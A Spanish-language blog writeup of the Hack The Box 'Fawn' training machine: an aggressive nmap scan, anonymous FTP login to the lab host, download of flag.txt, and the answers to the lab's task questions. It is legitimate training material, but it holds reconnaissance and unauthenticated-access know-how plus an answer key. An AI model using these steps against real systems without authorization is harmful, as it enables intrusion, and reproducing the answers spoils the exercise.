---
title: HTB - Starting Point - Tier 0 - Fawn Writeup
date: 2022-08-09 09:10:00 +0800
categories: [HTB, Writeup]
tags: [htb, writeups]     # TAG names should always be lowercase
---

Este post forma parte de la serie **Tier 0** del **Starting Point** de [HTB](https://app.hackthebox.com/starting-point) que iniciamos [aquí]({% post_url 2022-08-09-htb-writeup-tier0-meow %}).

## Fawn

El primer paso será iniciar la máquina (para lo que previamente tendremos que tener establecida nuestra conexión VPN)

![](/assets/posts/20220809/img03.png)

Copiamos la IP del equipo remoto, en mi caso *10.129.211.1*, y lanzamos un **nmap**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]
└─$ nmap -A 10.129.211.1 -oN nmap_output
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 10:37 CEST
Nmap scan report for 10.129.211.1
Host is up (0.047s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.16.72
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.39 seconds
```

Significado de las flags:

* `-A`&nbsp;: escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón.
* `-oN`&nbsp;: imprime la salida en un fichero de texto con el nombre *nmap_output*

En vista de que tiene un servicio *ftp* corriendo en el puerto *21/tcp* vamos a por él utilizando el usuario *anonymous* y sin password.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]
└─$ ftp 10.129.211.1
Connected to 10.129.211.1.
220 (vsFTPd 3.0.3)
Name (10.129.211.1:ewan67): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||5149|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||47085|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |*************************************************************************************************************************|    32        0.39 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.21 KiB/s)
ftp>
```

En nuestro directorio de trabajo tendremos descargado el fichero *flag.txt* con la bandera correspondiente.

## Respuestas:

* <strong>Task 1</strong>: File Transfer Protocol
* <strong>Task 2</strong>: 21
* <strong>Task 3</strong>: SFTP
* <strong>Task 4</strong>: ping
* <strong>Task 5</strong>: vsftpd 3.0.3
* <strong>Task 6</strong>: Unix
* <strong>Task 7</strong>: ftp -h
* <strong>Task 8</strong>: anonymous